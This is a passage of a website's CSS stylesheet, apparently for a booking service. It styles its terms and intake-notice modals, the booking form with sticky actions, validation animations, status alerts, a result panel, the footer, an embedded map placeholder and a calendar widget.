            padding: 0.6rem;
            /* Ensure it covers screen */
            inset: 0;
            overflow-y: auto; /* Changed to auto to prevent unnecessary scrollbar */
        }

        #termsModal {
            z-index: 20001;
        }

        #intakeNoticeModal {
            z-index: 20001;
        }

        #intakeNoticeModal .modal__content {
            max-width: 37.5rem;
            background: #3a2a1a;
            border: 1px solid rgba(255, 255, 255, 0.15);
            box-shadow: 0 1.3rem 3.1rem rgba(0,0,0,0.5);
            padding: 2.3rem 2rem 1.6rem;
        }

        #intakeNoticeModal .modal__title {
            text-align: center;
            color: #D4B89A;
            margin-bottom: 1.5rem;
            font-size: clamp(1.5rem, 6vw, 2.2rem);
        }

        #intakeNoticeModal .modal__body {
            max-height: min(66vh, 44rem);
            overflow-y: auto;
            padding-right: 0.4rem;
        }

        #intakeNoticeModal .modal__section-title {
            color: #ffffff;
            font-size: 1.1rem;
            border-bottom: 1px solid rgba(255,255,255,0.1);
            padding-bottom: 0.5rem;
            margin-top: 1.5rem;
            margin-bottom: 1rem;
        }

        #intakeNoticeModal .modal__text {
            color: rgba(255,255,255,0.92);
            text-align: left;
            margin-bottom: 0.72rem;
            line-height: 1.7;
            font-size: 1rem;
            font-weight: 400;
            letter-spacing: 0.01em;
            transition: none;
            transform: none;
        }

        #intakeNoticeModal .modal__text:hover {
            transform: none;
        }

        #intakeNoticeModal .intake-notice-modal__actions {
            margin-top: 1rem;
        }

        #intakeNoticeModal .intake-notice-modal__ok {
            width: auto;
            min-width: 9.5rem;
            margin: 0 auto;
            display: block;
            padding-inline: 2.2rem;
            background: #5a3d2a;
        }

        #intakeNoticeModal .intake-notice-modal__ok:hover {
            background: #4f3526;
        }

        #termsModal .modal__content {
            max-width: 50rem;
            background-color: #000000;
            background-image: none;
            border: 1px solid rgba(212, 184, 154, 0.35);
            box-shadow: 0 1.3rem 3.1rem rgba(0,0,0,0.55);
        }

        #termsModal .modal__title {
            text-align: center;
            color: #D4B89A;
            margin-bottom: 2rem;
            font-size: clamp(1.5rem, 6vw, 2.2rem);
        }
        
        #termsModal .modal__section-title {
            color: #D4B89A;
            font-size: 1.1rem;
            border-bottom: 1px solid rgba(212, 184, 154, 0.35);
            padding-bottom: 0.5rem;
            margin-top: 2rem;
            margin-bottom: 1rem;
        }

        #termsModal .modal__text {
            color: rgba(237, 237, 237, 0.94);
            text-align: left;
            margin-bottom: 0.72rem;
            line-height: 1.7;
            font-size: 1rem;
            font-weight: 400;
            letter-spacing: 0.01em;
        }

        #termsModal .modal__list {
            margin: 0 0 1.3rem 0;
            padding-left: 0;
            color: rgba(237, 237, 237, 0.94);
            list-style: none;
            font-family: 'Lato', sans-serif;
            font-size: 1rem;
            font-weight: 400;
            line-height: 1.7;
            letter-spacing: 0.01em;
            counter-reset: termsListItem;
        }

        #termsModal .modal__list li {
            position: relative;
            margin-bottom: 0.82rem;
            padding-left: 1.75rem;
            font-family: inherit;
            font-size: inherit;
            font-weight: inherit;
            line-height: inherit;
            letter-spacing: inherit;
        }

        #termsModal .modal__list li::before {
            counter-increment: termsListItem;
            content: counter(termsListItem) ".";
            position: absolute;
            left: 0;
            top: 0;
            color: #D4B89A;
            font-weight: 700;
        }

        #termsModal .modal__footer-text {
            text-align: center;
            color: rgba(212, 184, 154, 0.9);
            font-size: 0.9rem;
            margin-top: 2.5rem;
            border-top: 1px solid rgba(212, 184, 154, 0.28);
            padding-top: 1.3rem;
            font-weight: 800;
        }

        /* When active, use Flexbox to center */
        .modal--active { 
            display: flex !important; 
            align-items: flex-start !important;
            justify-content: center !important;
            padding-top: 5vh;
            padding-bottom: 5vh;
        }

        .modal__content {
            background: var(--accent-gold);
            border: 1px solid var(--glass-border);
            border-radius: 1.5rem;
            padding: 2.5rem;
            width: 100%;
            max-width: 37.5rem;
            text-align: center; /* Symmetrically center content */
            box-sizing: border-box;            
            display: flex;
            flex-direction: column;
            
            position: relative;
            box-shadow: 0 1.9rem 5.6rem rgba(0, 0, 0, 0.7), 0 0 1.2rem rgba(255, 255, 255, 0.05);
            animation: modalScaleIn 0.4s cubic-bezier(0.19, 1, 0.22, 1);
            
            /* Ensure it centers if flex alignment fails for some reason */
            margin: auto; /* Let flexbox handle centering perfectly */
        }

        @keyframes modalScaleIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        .modal__close {
            position: absolute;
            top: 1.3rem;
            left: 1.3rem;
            right: auto;
            background: none;
            border: none;
            font-size: 1.8rem;
            color: var(--text-white);
            cursor: pointer;
            padding: 0;
            width: 2.5rem;
            height: 2.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: color 0.3s ease;
            z-index: 10;
        }

        .modal__close:hover { color: #D4B89A; }

        .modal__title {
            font-size: clamp(1.1rem, 4vw, 1.4rem);
            font-weight: 800;
            margin-bottom: 1rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            flex-shrink: 0;
        }

        .modal__body {
            font-size: 1rem;
            font-weight: 400;
            color: rgba(255,255,255,0.92);
            line-height: 1.7;
            text-align: left;
            letter-spacing: 0.01em;
            margin-bottom: 1.3rem; 
            padding: 0 0.3rem;
        }

        /* Sticky modal action area anchored to viewport bottom while modal body scrolls */
        .modal-sticky-actions {
            position: sticky;
            bottom: max(0.5rem, env(safe-area-inset-bottom));
            z-index: 25;
            padding-top: 0.95rem;
            padding-bottom: 0.1rem;
            margin-top: 0.9rem;
            background: transparent;
            backdrop-filter: none;
            -webkit-backdrop-filter: none;
            isolation: isolate;
        }

        #bookingModal[data-state="form"] .modal-sticky-actions {
            --sticky-bottom-bleed: clamp(56px, 11vh, 132px);
            position: sticky;
            left: auto;
            right: auto;
            bottom: -0.55rem;
            z-index: 25;
            margin: -0.12rem 0 0;
            padding: clamp(1.35rem, 3.6vh, 2.1rem) 0.65rem 0.5rem;
            background: linear-gradient(
                to bottom,
                rgba(107, 91, 74, 0.00) 0%,
                rgba(107, 91, 74, 0.00) 10%,
                rgba(107, 91, 74, 0.72) 34%,
                rgba(107, 91, 74, 1.00) 52%,
                rgba(107, 91, 74, 1.00) 100%
            );
            backdrop-filter: none;
            -webkit-backdrop-filter: none;
            border-top: none;
            box-shadow: none;
            -webkit-mask-image: none;
            mask-image: none;
            isolation: isolate;
        }

        #bookingModal[data-state="form"] .modal-sticky-actions::before {
            content: none;
        }

        #bookingModal[data-state="form"] .modal-sticky-actions::after {
            content: none;
        }

        /* Decorative sticky layer must not block taps on underlying content */
        #bookingModal[data-state="form"] .modal-sticky-actions {
            pointer-events: none;
        }

        /* Keep actual controls clickable */
        #bookingModal[data-state="form"] .modal-sticky-actions > * {
            position: relative;
            z-index: 3;
            pointer-events: auto;
        }

        #bookingModal .modal-sticky-actions .contact-form__submit-button {
            margin: 0 !important;
        }

        #bookingModal .modal-sticky-actions #bookingRecaptchaWrap {
            order: 1;
            width: min(100%, 37.5rem);
            margin: 0 auto 0.45rem !important;
        }

        #bookingModal .modal-sticky-actions #bookingRecaptchaWrap .recaptcha-wrap__hint {
            margin-bottom: 0.35rem;
        }

        #bookingModal .modal-sticky-actions #confirmBookingBtn {
            order: 4;
        }

        #bookingModal .modal-sticky-actions .contact-form__checkbox-wrapper {
            order: 5;
            justify-content: center;
            align-items: center;
            margin-top: 0.55rem !important;
            margin-bottom: 0 !important;
            padding-bottom: 0;
        }

        #bookingModal[data-state="form"] #bookingForm .modal-sticky-actions {
            position: sticky;
            bottom: 0;
            width: 100%;
            box-sizing: border-box;
            display: grid;
            justify-items: center;
            align-content: end;
            gap: 0.05rem;
        }

        #bookingModal #hearAboutInput {
            margin-bottom: 0;
        }

        #bookingModal[data-state="form"] #bookingForm > .contact-form__group:last-of-type {
            margin-bottom: 0;
        }

        #bookingModal[data-state="form"] #bookingForm .modal-sticky-actions #bookingRecaptchaWrap,
        #bookingModal[data-state="form"] #bookingForm .modal-sticky-actions .contact-form__checkbox-wrapper,
        #bookingModal[data-state="form"] #bookingForm .modal-sticky-actions .contact-form__submit-button {
            width: min(100%, 37.5rem);
            margin-left: auto !important;
            margin-right: auto !important;
        }

        #bookingModal[data-state="form"] #bookingForm .booking-status-slot {
            width: min(100%, 37.5rem);
            min-height: 3rem;
            margin: 0.2rem auto 0.45rem;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        #bookingModal[data-state="form"] #bookingForm .modal-sticky-actions #confirmBookingBtn {
            display: block !important;
            width: auto !important;
            min-width: 14rem !important;
            max-width: 96% !important;
            margin-left: auto !important;
            margin-right: auto !important;
            background: #5a3d2a !important;
            border-color: #5a3d2a !important;
            color: #ffffff !important;
        }

        #bookingModal[data-state="form"] .modal-sticky-actions-secondary {
            display: none;
        }

        .modal__section-title {
            font-size: 1.2rem;
            font-weight: 800;
            margin-top: 1.3rem;
            margin-bottom: 0.6rem;
            text-transform: uppercase;
        }
        
        .modal__text { 
            margin-bottom: 0.72rem; 
            color: rgba(255,255,255,0.92);
            font-size: 1rem;
            font-weight: 400;
            line-height: 1.7;
            text-align: left;
            letter-spacing: 0.01em;
        }

        /* Booking modal typography aligned with FAQ first Q/A style */
        #bookingModal,
        #bookingModal * {
            font-family: 'Lato', sans-serif !important;
        }

        #bookingModal .modal__title,
        #bookingModal .modal__title span {
            font-family: 'Lato', sans-serif !important;
            font-size: clamp(1rem, 3vw, 1.2rem) !important;
            font-weight: 800 !important;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            line-height: 1.4 !important;
            color: #ffffff;
        }

        #bookingModal {
            --booking-form-font-size: 1.2rem;
            --booking-modal-vpad: clamp(0.55rem, 1.8vh, 0.95rem);
            --booking-modal-max-height: calc(100vh - (var(--booking-modal-vpad) * 2));
            --booking-modal-max-height: calc(100dvh - (var(--booking-modal-vpad) * 2));
            overflow-y: hidden;
            overflow-x: hidden;
        }

        #bookingModal.modal--active {
            align-items: center !important;
            padding-top: var(--booking-modal-vpad);
            padding-bottom: var(--booking-modal-vpad);
        }

        #bookingModal[data-state="form"].modal--active {
            padding-top: var(--booking-modal-vpad) !important;
            padding-bottom: var(--booking-modal-vpad) !important;
        }

        #bookingModal .modal__content {
            overflow: hidden;
            max-height: var(--booking-modal-max-height);
            height: var(--booking-modal-max-height);
            min-height: 0;
            margin: 0 auto;
            display: flex;
            flex-direction: column;
        }

        #bookingModal .modal__body {
            flex: 1 1 auto;
            min-height: 0;
            overflow-y: auto;
            overflow-x: hidden;
            overscroll-behavior: contain;
            -ms-overflow-style: none;
            scrollbar-width: none;
            padding-bottom: 0;
        }

        #bookingModal .modal__body::-webkit-scrollbar {
            width: 0;
            height: 0;
            display: none;
        }

        #bookingModal[data-state="form"] .modal__body {
            --booking-top-fade-height: clamp(1.9rem, 5.2vh, 3rem);
            position: relative;
            display: block;
            overflow-y: auto;
            overflow-x: hidden;
            padding-top: 0 !important;
            padding-bottom: 0;
        }

        #bookingModal[data-state="form"] .modal__body::before {
            content: "";
            position: sticky;
            top: 0;
            display: block;
            height: var(--booking-top-fade-height);
            margin-bottom: calc(var(--booking-top-fade-height) * -1);
            z-index: 24;
            pointer-events: none;
            background: linear-gradient(
                to bottom,
                rgba(107, 91, 74, 1) 0%,
                rgba(107, 91, 74, 0.96) 24%,
                rgba(107, 91, 74, 0.72) 52%,
                rgba(107, 91, 74, 0.34) 76%,
                rgba(107, 91, 74, 0) 100%
            );
        }

        #bookingModal #bookingForm {
            overflow-x: hidden;
            min-height: 100%;
            display: flex;
            flex-direction: column;
        }

        #bookingModal[data-state="form"] #bookingForm > .contact-form__group:first-child > div {
            margin-top: 0 !important;
        }

        #bookingModal[data-state="form"] #bookingForm {
            flex: 1 1 auto;
            min-height: 100%;
            overflow: visible;
            padding-bottom: 0;
        }

        #bookingModal #bookingForm .modal-sticky-actions {
            margin-top: auto;
            bottom: 0;
        }

        #bookingModal .modal__body,
        #bookingModal .modal__body p,
        #bookingModal .contact-form__label,
        #bookingModal .contact-form__terms-link,
        #bookingModal .file-attach__name,
        #bookingModal .file-attach__remove {
            font-family: 'Lato', sans-serif !important;
            font-size: var(--booking-form-font-size) !important;
            font-weight: 400 !important;
            color: rgba(255,255,255,0.92) !important;
            line-height: 1.6 !important;
            letter-spacing: 0.01em !important;
        }

        /* Default booking placeholders: match Name placeholder style */
        #bookingModal .contact-form__input::placeholder,
        #bookingModal .contact-form__textarea::placeholder {
            font-family: 'Lato', sans-serif !important;
            font-size: var(--booking-form-font-size) !important;
            font-weight: 400 !important;
            color: rgba(255,255,255,0.92) !important;
            opacity: 0.7 !important;
            line-height: 1.6 !important;
            letter-spacing: 0.01em !important;
        }

        #bookingModal #deadlineInputMain::placeholder {
            text-align: center !important;
        }

        #bookingModal .booking-row--address-city {
            width: 100%;
            align-items: center;
            justify-content: flex-start;
        }

        #bookingModal .booking-row--address-city .custom-select-wrapper--city {
            flex: 1 1 auto !important;
            width: auto !important;
            min-width: 0 !important;
        }

        #bookingModal .booking-row--address-city .custom-select-wrapper--province {
            margin-left: auto;
        }

        #bookingModal .booking-row--address-city .custom-select--city .custom-select__trigger {
            width: 100% !important;
            min-width: 0 !important;
        }

        #bookingModal .booking-row--address-secondary {
            justify-content: center !important;
            align-items: center !important;
            flex-wrap: nowrap !important;
            gap: 0.55rem !important;
        }

        #bookingModal .booking-row--address-secondary.booking-row--province-zip {
            justify-content: flex-end !important;
        }

        #bookingModal .booking-row--province-zip .booking-row__label {
            margin: 0;
            flex: 0 0 auto;
            white-space: nowrap;
            text-transform: none;
            letter-spacing: 0;
            color: var(--text-white);
        }

        #bookingModal .custom-select-wrapper--province {
            flex: 0 0 148px !important;
            width: 148px !important;
            min-width: 148px !important;
            max-width: 148px !important;
            margin-bottom: 0 !important;
        }

        #bookingModal .custom-select--province .custom-select__trigger {
            width: 100% !important;
            min-width: 0 !important;
            padding-left: 0.65rem !important;
            padding-right: 2.15rem !important;
            text-transform: uppercase;
            text-align: center;
        }

        #bookingModal .custom-select--province .custom-select__trigger span {
            width: 100%;
            text-align: center;
            text-overflow: clip;
        }

        #bookingModal .custom-select--province .custom-options {
            max-height: 11rem;
            overflow-y: auto;
            overflow-x: hidden;
            width: max-content;
            min-width: 100%;
            right: auto;
            left: 0;
        }

        #bookingModal .custom-select--province .custom-option {
            text-transform: uppercase;
            white-space: nowrap;
            padding-right: 1.2rem;
        }

        #bookingModal input[name="address_zip"] {
            flex: 0 0 180px !important;
            width: 180px !important;
            min-width: 180px !important;
            max-width: 180px !important;
            padding-left: 0 !important;
            padding-right: 0 !important;
            text-align: center;
            caret-color: #ffffff;
        }

        @media (min-width: 769px) {
            #bookingModal #deadlineInputMain {
                flex: 0 0 clamp(11rem, 16vw, 14rem) !important;
                width: clamp(11rem, 16vw, 14rem) !important;
                min-width: clamp(11rem, 16vw, 14rem) !important;
            }

            #bookingModal .booking-row--address-city .custom-select-wrapper--city {
                flex: 1 1 auto !important;
                min-width: 0 !important;
            }
        }

        #bookingModal input[name="address_zip"]:focus {
            caret-color: #5a3d2a !important;
        }

        #bookingModal input[name="address_zip"]::placeholder,
        #bookingModal #deadlineInputMain::placeholder {
            text-align: center !important;
        }

        #bookingModal .contact-form__input:focus::placeholder,
        #bookingModal .contact-form__textarea:focus::placeholder,
        #bookingModal .contact-form__input:focus-visible::placeholder,
        #bookingModal .contact-form__textarea:focus-visible::placeholder {
            color: transparent !important;
            opacity: 0 !important;
        }

        #bookingModal #dobAgePreview::placeholder {
            text-align: center !important;
            color: rgba(255,255,255,0.92) !important;
            opacity: 0.56 !important;
        }

        #bookingModal #dobAgePreview:focus::placeholder {
            color: transparent !important;
            opacity: 0 !important;
        }

        #bookingModal input[name="address_zip"]::placeholder {
            color: rgba(255,255,255,0.92) !important;
            opacity: 0.56 !important;
        }

        #bookingModal .contact-form__checkbox-label {
            font-family: 'Lato', sans-serif !important;
            font-size: var(--booking-form-font-size) !important;
            font-weight: 700 !important;
            line-height: 1.35 !important;
            letter-spacing: 0 !important;
        }

        /* Occupation-like style for every editable control in booking modal */
        #bookingModal .contact-form__input,
        #bookingModal .contact-form__textarea,
        #bookingModal .custom-select__trigger {
            font-family: 'Lato', sans-serif !important;
            font-size: var(--booking-form-font-size) !important;
            font-weight: 800 !important;
            line-height: 1.3 !important;
            letter-spacing: 0.01em !important;
        }

        #bookingModal .contact-form__input,
        #bookingModal .custom-select__trigger {
            min-height: 3.3rem !important;
            height: 3.3rem !important;
        }

        #bookingModal .file-attach__btn {
            min-height: 5.25rem !important;
            height: 5.25rem !important;
        }

        #bookingModal .custom-select__trigger {
            border: none !important;
            box-shadow: 0 4px 0 rgba(58, 42, 26, 0.35) !important;
        }

        #bookingModal .contact-form__input:focus,
        #bookingModal .contact-form__textarea:focus,
        #bookingModal .contact-form__input--has-content {
            background: #ffffff !important;
            color: #5a3d2a !important;
            -webkit-text-fill-color: #5a3d2a !important;
            caret-color: #5a3d2a !important;
        }

        #bookingModal .file-attach__btn:hover,
        #bookingModal .file-attach__btn:focus-visible {
            color: #5a3d2a !important;
        }

        /* Dropdown text must stay brown on white background */
        #bookingModal .custom-option {
            font-size: var(--booking-form-font-size) !important;
            font-weight: 800 !important;
            color: rgba(80, 60, 40, 0.9) !important;
        }

        #bookingModal .file-attach__title,
        #bookingModal .file-attach__hint {
            font-family: 'Lato', sans-serif !important;
            font-size: var(--booking-form-font-size) !important;
            font-weight: 400 !important;
            line-height: 1.6 !important;
            letter-spacing: 0.01em !important;
            text-transform: none !important;
        }

        #bookingModal .custom-option.selected {
            color: #3a2a1a !important;
        }

        #bookingModal .custom-select.open .custom-select__trigger,
        #bookingModal .custom-select.open .custom-select__trigger span {
            color: #5a3d2a !important;
        }

        #bookingModal .contact-form__submit-button {
            font-size: var(--booking-form-font-size) !important;
        }

        #bookingModal #confirmBookingBtn {
            font-size: clamp(1.2rem, 4vw, 2rem) !important;
            font-weight: 900 !important;
            letter-spacing: 0.06em !important;
            line-height: 1 !important;
            text-transform: uppercase !important;
        }

        #bookingModal #confirmBookingBtn,
        #bookingModal #confirmBookingBtn:hover,
        #bookingModal #confirmBookingBtn:active {
            box-shadow: none !important;
        }

        #bookingStatus {
            --booking-status-fg: #ffe8f3;
            --booking-status-border: rgba(255, 128, 184, 0.95);
            --booking-status-bg: rgba(255, 130, 188, 0.24);
            min-height: 0;
            width: 100%;
            max-width: min(100%, 37.5rem);
            margin: 0 auto !important;
            padding: 0;
            border-radius: 0.8rem;
            border: 1px solid transparent;
            background: transparent;
            color: var(--booking-status-fg) !important;
            font-size: var(--booking-form-font-size) !important;
            font-weight: 900 !important;
            line-height: 1.2 !important;
            letter-spacing: 0.02em !important;
            text-align: center;
            display: none;
            opacity: 1;
            transform: none;
            transition: none;
            pointer-events: none;
        }

        #bookingStatus.status-alert--visible {
            display: block;
            padding: 0.55rem 0.9rem;
            border-color: var(--booking-status-border);
            background: var(--booking-status-bg);
            opacity: 1;
            transform: none;
            animation: bookingStatusIn 0.28s ease-out;
            box-shadow: 0 0 0.45rem rgba(255, 162, 210, 0.24);
        }

        @keyframes bookingStatusIn {
            from { opacity: 0; transform: translateY(4px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes bookingStatusSoftPulse {
            0%, 100% { opacity: 0.94; }
            50% { opacity: 1; }
        }

        #bookingStatus.status-alert--success {
            --booking-status-fg: #e9ffef;
            --booking-status-border: rgba(102, 220, 130, 0.74);
            --booking-status-bg: rgba(56, 175, 95, 0.2);
            --booking-status-pulse: rgba(84, 214, 123, 0.2);
        }

        #bookingStatus.status-alert--warning {
            --booking-status-fg: #ffe8f3;
            --booking-status-border: rgba(255, 138, 191, 1);
            --booking-status-bg: rgba(255, 147, 200, 0.28);
        }

        #bookingStatus.status-alert--error {
            --booking-status-fg: #ffe8f3;
            --booking-status-border: rgba(255, 116, 179, 0.98);
            --booking-status-bg: rgba(255, 120, 184, 0.32);
        }

        .booking-scroll-cue {
            width: min(100%, 37.5rem);
            margin: -0.32rem 0 0.34rem 0;
            text-align: center;
            pointer-events: none;
            user-select: none;
            line-height: 1;
            transform: translateY(-0.22rem);
            position: relative;
            z-index: 3;
        }

        .booking-scroll-cue span {
            display: inline-block;
            margin: 0 0.1rem;
            color: #ff67b0;
            font-size: 1.12rem;
            font-weight: 900;
            opacity: 0.96;
            text-shadow: 0 1px 0 rgba(0, 0, 0, 0.3);
            animation: bookingScrollChevronRainbow 1.2s cubic-bezier(0.2, 0.65, 0.2, 1) infinite;
            will-change: transform, color, opacity, text-shadow;
            transform-origin: 50% 50%;
        }

        .booking-scroll-cue span:nth-child(2) {
            animation-delay: 0.16s;
        }

        .booking-scroll-cue span:nth-child(3) {
            animation-delay: 0.32s;
        }

        @keyframes bookingScrollChevronRainbow {
            0% {
                transform: translateY(-1px) scale(0.97);
                color: #ff67b0; /* pink */
                opacity: 0.58;
                text-shadow: 0 1px 0 rgba(0, 0, 0, 0.28);
            }
            25% {
                transform: translateY(1px) scale(1.03);
                color: #b8ff4a; /* light green */
                opacity: 1;
                text-shadow: 0 1px 0 rgba(0, 0, 0, 0.18);
            }
            50% {
                transform: translateY(3px) scale(1.05);
                color: #ff5050; /* red */
                opacity: 1;
                text-shadow: 0 1px 0 rgba(0, 0, 0, 0.2);
            }
            75% {
                transform: translateY(5px) scale(1.02);
                color: #58a8ff; /* blue */
                opacity: 0.95;
                text-shadow: 0 1px 0 rgba(0, 0, 0, 0.22);
            }
            100% {
                transform: translateY(6px) scale(0.97);
                color: #ff8f3d; /* orange */
                opacity: 0.58;
                text-shadow: 0 1px 0 rgba(0, 0, 0, 0.28);
            }
        }

        .contact-form__input.field-invalid,
        .contact-form__textarea.field-invalid,
        .custom-select__trigger.field-invalid {
            animation: invalidFieldBorderPulse 0.5s ease-out 1, invalidFieldBorderBreath 1.45s ease-in-out infinite !important;
            box-shadow: none !important;
            border: 2px solid #ff73af !important;
            transform: none !important;
            will-change: auto;
        }

        #bookingModal .custom-select__trigger.field-invalid {
            border: 2px solid #ff73af !important;
            box-shadow: none !important;
        }

        @keyframes invalidFieldBorderPulse {
            0% {
                transform: translateX(0);
            }
            22% {
                transform: translateX(-2px);
            }
            44% {
                transform: translateX(2px);
            }
            66% {
                transform: translateX(-1px);
            }
            100% {
                transform: translateX(0);
            }
        }

        @keyframes invalidFieldBorderBreath {
            0%, 100% {
                border-color: #ff73af;
            }
            50% {
                border-color: #ffa2ca;
            }
        }

        .contact-form__checkbox-wrapper.field-invalid {
            animation: none !important;
            box-shadow: none !important;
        }

        .contact-form__checkbox-wrapper.field-invalid .contact-form__checkbox {
            border-color: #ff73af !important;
            box-shadow: none !important;
            animation: invalidCheckboxBorderBreath 1.15s ease-in-out infinite !important;
        }

        @keyframes invalidCheckboxBorderBreath {
            0%, 100% {
                border-color: #ff73af;
                transform: scale(1);
            }
            50% {
                border-color: #ff9fc8;
                transform: scale(0.97);
            }
        }

        #bookingRecaptchaWrap.field-invalid {
            border: 2px solid #ff73af;
            border-radius: 0.8rem;
            padding: 0.45rem 0.45rem 0.2rem;
            background: rgba(255, 131, 191, 0.08);
            animation: invalidRecaptchaBorderBreath 1.25s ease-in-out infinite;
        }

        @keyframes invalidRecaptchaBorderBreath {
            0%, 100% {
                border-color: #ff73af;
            }
            50% {
                border-color: #ff9fc8;
            }
        }

        .final-result-form {
            padding: 0.45rem 0.1rem 0.2rem;
            text-align: left;
        }

        .final-result-form__icon {
            color: #ffffff;
            margin: 0 auto 1.05rem;
            position: relative;
            display: flex;
            width: 6.25rem;
            height: 6.25rem;
            align-items: center;
            justify-content: center;
            border-radius: 0;
            background: none;
            border: none;
        }

        .final-result-form__icon svg {
            width: 100%;
            height: 100%;
        }

        .final-result-form__hello {
            font-size: 1.12rem;
            font-weight: 900;
            margin: 0 0 0.7rem 0;
            text-align: left;
        }

        .final-result-form__lead {
            font-size: 1rem;
            line-height: 1.55;
            margin: 0 0 1rem 0;
            text-align: left;
        }

        .final-result-grid {
            display: grid;
            grid-template-columns: repeat(2, minmax(0, 1fr));
            gap: 0.72rem;
            margin: 0 0 1rem 0;
        }

        .final-result-field {
            padding: 0.68rem 0.78rem;
            border-radius: 0.85rem;
            border: 1px solid rgba(255, 255, 255, 0.22);
            background: rgba(255, 255, 255, 0.08);
            min-height: 4.1rem;
        }

        .final-result-field--full {
            grid-column: 1 / -1;
        }

        .final-result-label {
            display: block;
            margin-bottom: 0.35rem;
            font-size: 0.76rem;
            font-weight: 900;
            letter-spacing: 0.08em;
            text-transform: uppercase;
            color: rgba(255, 255, 255, 0.8);
        }

        .final-result-value {
            font-size: 0.98rem;
            line-height: 1.45;
            color: #fff;
            word-break: break-word;
        }

        .final-result-warning {
            font-size: 0.94rem;
            line-height: 1.55;
            margin: 0 0 0.88rem 0;
            text-align: left;
            padding: 0.78rem 0.85rem;
            border-radius: 0.85rem;
            border: 1px solid rgba(255, 255, 255, 0.22);
            background: rgba(255, 255, 255, 0.09);
        }

        .final-result-referral {
            margin-top: 0.4rem;
            margin-bottom: 0.9rem;
            padding: 0.78rem 0.85rem;
            border-radius: 0.85rem;
            border: 1px solid rgba(255, 255, 255, 0.2);
            background: rgba(255, 255, 255, 0.07);
        }

        .final-result-referral__label {
            display: block;
            margin-bottom: 0.52rem;
            font-size: 0.92rem;
            line-height: 1.45;
            color: rgba(255, 255, 255, 0.92);
        }

        .final-result-referral__input {
            margin-bottom: 0.58rem;
            font-size: 0.95rem;
        }

        .final-result-referral__actions {
            display: flex;
            align-items: center;
            gap: 0.65rem;
        }

        .final-result-referral__btn {
            width: auto !important;
            min-width: 7.1rem;
            padding: 0.58rem 1rem !important;
            margin: 0 !important;
            font-size: 0.86rem !important;
            font-weight: 800 !important;
        }

        .final-result-referral__status {
            font-size: 0.84rem;
            color: rgba(255, 255, 255, 0.82);
            line-height: 1.4;
        }

        .final-result-referral__status--success {
            color: #a8efb9;
        }

        .final-result-referral__status--warning {
            color: #f6d78c;
        }

        .final-result-referral__status--error {
            color: #ff9ea1;
        }

        .final-result-actions {
            display: flex;
            flex-direction: column;
            gap: 0.75rem;
            margin-top: 1.1rem;
        }

        .final-result-call {
            width: 100%;
            margin: 0 !important;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-weight: 900 !important;
            letter-spacing: 0.02em;
            box-shadow: 0 0.7rem 1.5rem rgba(0, 0, 0, 0.2) !important;
        }

        .final-result-done {
            width: 100%;
            margin: 0 !important;
            background: rgba(255,255,255,0.16) !important;
            border: 1px solid rgba(255,255,255,0.3) !important;
            color: #fff !important;
            font-weight: 800 !important;
            box-shadow: 0 0.7rem 1.5rem rgba(0, 0, 0, 0.16) !important;
        }

        #bookingModal .contact-form__submit-button.final-result-call,
        #bookingModal .contact-form__submit-button.final-result-call:hover {
            box-shadow: 0 0.7rem 1.5rem rgba(0, 0, 0, 0.2) !important;
        }

        #bookingModal .contact-form__submit-button.final-result-done,
        #bookingModal .contact-form__submit-button.final-result-done:hover {
            box-shadow: 0 0.7rem 1.5rem rgba(0, 0, 0, 0.16) !important;
        }

        @media (max-width: 650px) {
            .final-result-grid {
                grid-template-columns: 1fr;
            }
        }
        
        .modal__highlight { font-weight: 800; color: #D4B89A; }
        
        .modal__footer-text {
            margin-top: 2rem; 
            padding-top: 1.3rem; 
            border-top: 1px solid rgba(255, 255, 255, 0.2); 
            font-size: 1.2rem; 
            color: #ffffff; 
            font-weight: 800;
        }

        /* Block: footer */
        .footer {
            text-align: center;
            padding: 5rem 1.3rem 1.3rem;
            margin-top: -5px;
            color: rgba(255, 255, 255, 0.8);
            font-size: 0.9rem;
            line-height: 1.8;
        }

        .footer__container { margin-bottom: 3.1rem; }
        
        .footer__contact-link {
            display: block;
            color: #ffffff; 
            font-size: clamp(1.4rem, 5vw, 1.8rem);
            font-weight: 800;
            text-decoration: none;
            margin: 2rem 0 0.6rem;
        }

        .footer__hours {
            font-size: 1rem;
            color: rgba(255,255,255,0.92);
            margin-bottom: 1.3rem;
            white-space: pre-line;
            line-height: 1.7;
            font-weight: 400;
            text-align: center;
            letter-spacing: 0.01em;
        }

        /* Block: map-container */
        .map-container {
            width: 100%; 
            height: clamp(18rem, 52vw, 28rem); 
            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIHZpZXdCb3g9IjAgMCA4MDAgNDAwIiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJub25lIj48cmVjdCB3aWR0aD0iODAwIiBoZWlnaHQ9IjQwMCIgZmlsbD0iI2UzZTNTzIiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMjQiIGZpbGw9IiM1NTUiPk1hcCBMb2FkaW5nLi4uPC90ZXh0Pjwvc3ZnPg=='); 
            background-size: cover; 
            border-radius: 0.6rem; 
            overflow: hidden;
        }

        .map-container__iframe {
            border: 0;
            width: 100%;
            height: 100%;
        }

        /* ------------------- CUSTOM CALENDAR (Liquid Glass Design) ------------------- */
        .calendar-scale-wrapper {
            width: 100%;
            overflow: visible;
        }

        .calendar-scale-inner {
            width: 41rem;
            transform-origin: top left;
            will-change: transform;
        }

        .calendar-wrapper {
            background: rgba(255, 255, 255, 0.01);
            backdrop-filter: blur(1.3rem);
            -webkit-backdrop-filter: blur(1.3rem);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 3rem;
            padding: 2.05rem;
            margin-top: 0;
            position: relative; /* Added for loader overlay */
            --calendar-reserve-min-height: clamp(44rem, 78vh, 52rem);
            min-height: var(--calendar-reserve-min-height);
